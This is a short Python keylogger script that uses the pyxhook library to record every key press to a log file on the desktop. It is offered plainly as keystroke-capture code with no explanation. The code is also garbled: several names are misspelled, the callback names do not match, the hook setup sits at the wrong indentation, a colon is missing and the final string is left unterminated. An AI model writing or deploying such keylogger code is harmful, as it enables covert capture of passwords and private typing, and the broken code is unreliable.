import os 
import pyxhook

log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

cancel_key = ord(os.environ.get('pylogger_cancel', '`')[0])

if os.envrion.get('pylogger_clean', None) is not None:
	try:
		os.remove(log_file)
	except EnvrionmentError:
		pass

def onKeyPress(event):
	with open(log_file, 'a') as f:
		f.write('{}\n'.format(event.Key))
	
	hook_n1 = pyxhook.HookManager()
	hook_n1.KeyDown = OnKeyPress

	hook_n1.HookKeyboard()

	try:
		hook_n1.start()
	except KeyboardInterrupt
		pass
	except Exception as ex:
		msg = 'Error while catching events:\n {}'.format(ex)
		pyxhook.print_err(msg)
		with open(log_file, 'a') as f:
			f.write('\n{}/format(msg))
